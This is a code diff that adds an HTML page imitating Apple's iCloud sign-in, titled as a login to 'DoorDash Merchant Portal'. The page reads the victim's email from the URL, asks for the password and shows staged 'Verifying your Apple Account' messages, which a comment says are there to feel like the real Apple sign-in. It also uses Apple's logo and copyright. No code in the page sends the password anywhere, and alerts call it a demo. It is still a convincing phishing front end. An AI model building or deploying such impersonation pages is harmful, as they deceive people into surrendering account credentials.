@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to iCloud</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Crect width='48' height='48' rx='10' fill='%23ffffff'/%3E%3Cpath d='M33.5 27.5c0-3.6-2.9-6.5-6.5-6.5-.4 0-.8 0-1.1.1-.9-3.4-4-5.9-7.6-5.9-4.4 0-8 3.6-8 8 0 .1 0 .2 0 .3-2.5.6-4.3 2.8-4.3 5.5 0 3.1 2.5 5.6 5.6 5.6h16.3c3.1 0 5.6-2.5 5.6-5.6z' fill='%23000'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            color: #1d1d1f;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 40px 40px 32px;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06), 0 1px 3px rgba(0, 0, 0, 0.04);
+            position: relative;
+            min-height: 500px;
+        }
+
+        /* ---------- FORM VIEW ---------- */
+        .form-view.hidden {
+            display: none;
+        }
+
+        .apple-logo {
+            display: block;
+            width: 32px;
+            height: auto;
+            margin: 0 auto 8px;
+            color: #1d1d1f;
+        }
+
+        .icloud-logo {
+            display: block;
+            width: 90px;
+            height: auto;
+            margin: 0 auto 20px;
+        }
+
+        .heading {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1d1d1f;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .subheading {
+            font-size: 14px;
+            color: #6e6e73;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .account-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 15px;
+            color: #1d1d1f;
+            margin-bottom: 20px;
+            cursor: pointer;
+            padding: 6px 12px;
+            border-radius: 8px;
+            transition: background 0.12s ease;
+            width: fit-content;
+            max-width: 100%;
+            margin-left: auto;
+            margin-right: auto;
+            background: #f5f5f7;
+        }
+
+        .account-row:hover {
+            background: #ebebed;
+        }
+
+        .account-row .email-text {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-weight: 400;
+        }
+
+        .account-row .chevron {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+            color: #6e6e73;
+        }
+
+        .field-wrap {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-family: inherit;
+            color: #1d1d1f;
+            background: #ffffff;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.12s ease, box-shadow 0.12s ease;
+            -webkit-appearance: none;
+        }
+
+        .password-input::placeholder {
+            color: #86868b;
+        }
+
+        .password-input:hover {
+            border-color: #a1a1a6;
+        }
+
+        .password-input:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15);
+        }
+
+        .password-input.error {
+            border-color: #e30000;
+            box-shadow: 0 0 0 3px rgba(227, 0, 0, 0.12);
+        }
+
+        .error-text {
+            display: none;
+            font-size: 13px;
+            color: #e30000;
+            margin: 8px 0 4px;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .error-text.visible {
+            display: flex;
+        }
+
+        .error-text svg {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+        }
+
+        .signin-btn {
+            width: 100%;
+            background: #0071e3;
+            color: #ffffff;
+            font-size: 16px;
+            font-family: inherit;
+            font-weight: 500;
+            letter-spacing: -0.01em;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: background 0.12s ease;
+            -webkit-appearance: none;
+        }
+
+        .signin-btn:hover {
+            background: #0077ed;
+        }
+
+        .signin-btn:active {
+            background: #006edb;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1d1d1f;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .checkbox-row input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #0071e3;
+            cursor: pointer;
+        }
+
+        .links-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 24px;
+            font-size: 14px;
+            color: #6e6e73;
+        }
+
+        .links-row a {
+            color: #0071e3;
+            text-decoration: none;
+            font-weight: 400;
+        }
+
+        .links-row a:hover {
+            text-decoration: underline;
+        }
+
+        .links-row .dot {
+            color: #d2d2d7;
+        }
+
+        .back-row {
+            display: flex;
+            justify-content: center;
+            margin-top: 24px;
+        }
+
+        .back-link {
+            font-size: 14px;
+            color: #0071e3;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 400;
+            text-decoration: none;
+            padding: 4px 8px;
+            border-radius: 6px;
+        }
+
+        .back-link:hover {
+            background: #f5f5f7;
+            text-decoration: underline;
+        }
+
+        /* ---------- LOADING VIEW ---------- */
+        .loading-view {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 0 40px;
+            min-height: 400px;
+        }
+
+        .loading-view.visible {
+            display: flex;
+        }
+
+        .loading-view .apple-logo {
+            margin-bottom: 8px;
+        }
+
+        .loading-view .icloud-logo {
+            margin-bottom: 44px;
+        }
+
+        /* Apple-style spinner: iOS activity indicator */
+        .apple-spinner {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 28px;
+            height: 20px;
+            align-items: center;
+        }
+
+        .apple-spinner span {
+            display: block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #86868b;
+            animation: apple-pulse 1.2s ease-in-out infinite;
+        }
+
+        .apple-spinner span:nth-child(1) { animation-delay: 0s; }
+        .apple-spinner span:nth-child(2) { animation-delay: 0.15s; }
+        .apple-spinner span:nth-child(3) { animation-delay: 0.3s; }
+        .apple-spinner span:nth-child(4) { animation-delay: 0.45s; }
+        .apple-spinner span:nth-child(5) { animation-delay: 0.6s; }
+
+        @keyframes apple-pulse {
+            0%, 80%, 100% {
+                opacity: 0.3;
+                transform: scale(0.85);
+                background: #86868b;
+            }
+            40% {
+                opacity: 1;
+                transform: scale(1);
+                background: #0071e3;
+            }
+        }
+
+        .loading-text {
+            font-size: 15px;
+            color: #6e6e73;
+            font-weight: 400;
+            text-align: center;
+            letter-spacing: -0.01em;
+        }
+
+        /* Footer strip */
+        .apple-footer {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 20px 4px 0;
+            font-size: 12px;
+            color: #6e6e73;
+        }
+
+        .apple-footer .footer-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .apple-footer a {
+            color: #6e6e73;
+            text-decoration: none;
+        }
+
+        .apple-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .apple-footer .copyright {
+            font-size: 11px;
+            color: #86868b;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+                justify-content: flex-start;
+                background: #ffffff;
+            }
+            .card {
+                box-shadow: none;
+                padding: 32px 20px 24px;
+                min-height: auto;
+                border-radius: 0;
+            }
+            .loading-view {
+                min-height: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+
+        <!-- ================= FORM VIEW ================= -->
+        <div class="form-view" id="formView">
+            <!-- Apple logo -->
+            <svg class="apple-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Apple" fill="currentColor">
+                <path d="M17.05 12.5c-.02-2.03 1.66-3 1.73-3.05-.94-1.38-2.41-1.57-2.93-1.6-1.25-.13-2.44.74-3.07.74-.63 0-1.6-.72-2.63-.7-1.35.02-2.6.79-3.29 2-1.4 2.44-.36 6.05 1 8.03.67.96 1.46 2.05 2.5 2.01 1-.04 1.38-.65 2.59-.65s1.55.65 2.6.63c1.08-.02 1.76-.98 2.42-1.95.76-1.12 1.08-2.2 1.09-2.26-.02-.01-2.1-.81-2.11-3.2z"/>
+                <path d="M14.98 6.36c.55-.67.92-1.6.82-2.53-.79.03-1.75.53-2.32 1.19-.51.59-.96 1.55-.84 2.46.88.07 1.79-.45 2.34-1.12z"/>
+            </svg>
+
+            <!-- iCloud wordmark -->
+            <svg class="icloud-logo" viewBox="0 0 90 24" xmlns="http://www.w3.org/2000/svg" aria-label="iCloud">
+                <text x="0" y="18" font-family="-apple-system, BlinkMacSystemFont, SF Pro Text, Helvetica Neue, sans-serif" font-size="18" font-weight="600" fill="#1d1d1f" letter-spacing="-0.5">iCloud</text>
+            </svg>
+
+            <h1 class="heading" id="heading">Sign in to iCloud</h1>
+            <p class="subheading">to continue to DoorDash Merchant Portal</p>
+
+            <div class="account-row" id="accountChip" title="Switch account">
+                <span class="email-text" id="chipEmail">loading...</span>
+                <svg class="chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <div class="field-wrap">
+                <input
+                    class="password-input"
+                    id="password"
+                    type="password"
+                    placeholder="Password"
+                    autocomplete="current-password"
+                    aria-label="Password"
+                >
+            </div>
+
+            <p class="error-text" id="errorText">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/>
+                    <line x1="12" y1="7" x2="12" y2="13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                    <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
+                </svg>
+                <span id="errorMessage">Incorrect Apple Account or password.</span>
+            </p>
+
+            <label class="checkbox-row">
+                <input type="checkbox" id="rememberMe">
+                <span>Keep me signed in</span>
+            </label>
+
+            <button class="signin-btn" id="signinBtn" type="button">Sign in</button>
+
+            <div class="links-row">
+                <a href="#" id="forgotLink">Forgot password?</a>
+                <span class="dot">•</span>
+                <a href="#" id="createLink">Create Apple Account</a>
+            </div>
+
+            <div class="back-row">
+                <button class="back-link" id="backBtn" type="button">← Use a different account</button>
+            </div>
+        </div>
+
+        <!-- ================= LOADING VIEW ================= -->
+        <div class="loading-view" id="loadingView">
+            <svg class="apple-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Apple" fill="currentColor">
+                <path d="M17.05 12.5c-.02-2.03 1.66-3 1.73-3.05-.94-1.38-2.41-1.57-2.93-1.6-1.25-.13-2.44.74-3.07.74-.63 0-1.6-.72-2.63-.7-1.35.02-2.6.79-3.29 2-1.4 2.44-.36 6.05 1 8.03.67.96 1.46 2.05 2.5 2.01 1-.04 1.38-.65 2.59-.65s1.55.65 2.6.63c1.08-.02 1.76-.98 2.42-1.95.76-1.12 1.08-2.2 1.09-2.26-.02-.01-2.1-.81-2.11-3.2z"/>
+                <path d="M14.98 6.36c.55-.67.92-1.6.82-2.53-.79.03-1.75.53-2.32 1.19-.51.59-.96 1.55-.84 2.46.88.07 1.79-.45 2.34-1.12z"/>
+            </svg>
+
+            <svg class="icloud-logo" viewBox="0 0 90 24" xmlns="http://www.w3.org/2000/svg" aria-label="iCloud">
+                <text x="0" y="18" font-family="-apple-system, BlinkMacSystemFont, SF Pro Text, Helvetica Neue, sans-serif" font-size="18" font-weight="600" fill="#1d1d1f" letter-spacing="-0.5">iCloud</text>
+            </svg>
+
+            <div class="apple-spinner" aria-hidden="true">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <p class="loading-text" id="loadingText">Signing in…</p>
+        </div>
+
+    </div>
+
+    <div class="apple-footer">
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="copyright">Copyright © 2026 Apple Inc. All rights reserved.</div>
+    </div>
+
+    <script>
+        // ---- Read the email from the URL query string ----
+        const params = new URLSearchParams(window.location.search);
+        const rawEmail = params.get('email') || '';
+        const email = rawEmail.trim().toLowerCase();
+
+        // If no email was passed, send the user back to email.html
+        if (!email) {
+            window.location.replace('email.html');
+        }
+
+        // ---- Populate the account row ----
+        const chipEmail = document.getElementById('chipEmail');
+        chipEmail.textContent = email;
+
+        // ---- Elements ----
+        const passwordInput = document.getElementById('password');
+        const errorText = document.getElementById('errorText');
+        const errorMessage = document.getElementById('errorMessage');
+        const formView = document.getElementById('formView');
+        const loadingView = document.getElementById('loadingView');
+        const loadingText = document.getElementById('loadingText');
+
+        // ---- Views ----
+        function showLoading() {
+            formView.classList.add('hidden');
+            loadingView.classList.add('visible');
+            loadingText.textContent = 'Signing in…';
+        }
+
+        // ---- Validate + submit ----
+        const signinBtn = document.getElementById('signinBtn');
+
+        function showError(msg) {
+            errorMessage.textContent = msg || 'Incorrect Apple Account or password.';
+            errorText.classList.add('visible');
+            passwordInput.classList.add('error');
+            passwordInput.focus();
+        }
+
+        function clearError() {
+            errorText.classList.remove('visible');
+            passwordInput.classList.remove('error');
+        }
+
+        passwordInput.addEventListener('input', clearError);
+
+        signinBtn.addEventListener('click', () => {
+            const pwd = passwordInput.value;
+            if (!pwd) {
+                showError('Please enter your password.');
+                return;
+            }
+            if (pwd.length < 8) {
+                showError('Your password must be at least 8 characters.');
+                return;
+            }
+
+            // Show the Apple-style loading screen
+            showLoading();
+
+            // Staged loading messages to feel more like real Apple sign-in
+            const steps = [
+                { delay: 700,  text: 'Verifying your Apple Account…' },
+                { delay: 1400, text: 'Signing in…' },
+                { delay: 2100, text: 'Setting up iCloud…' }
+            ];
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    loadingText.textContent = step.text;
+                }, step.delay);
+            });
+
+            // After the loading sequence, go to success page
+            setTimeout(() => {
+                window.location.href = 'success.html?email=' + encodeURIComponent(email);
+            }, 2800);
+        });
+
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                signinBtn.click();
+            }
+        });
+
+        // ---- Back button: return to email.html ----
+        document.getElementById('backBtn').addEventListener('click', () => {
+            window.location.href = 'email.html';
+        });
+
+        // ---- Account chip: return to email.html ----
+        document.getElementById('accountChip').addEventListener('click', () => {
+            window.location.href = 'email.html';
+        });
+
+        // ---- Forgot link: no-op for now ----
+        document.getElementById('forgotLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Password reset is not available in this demo.');
+        });
+
+        // ---- Create account link: no-op for now ----
+        document.getElementById('createLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Account creation is not available in this demo.');
+        });
+    </script>
+</body>
+</html>
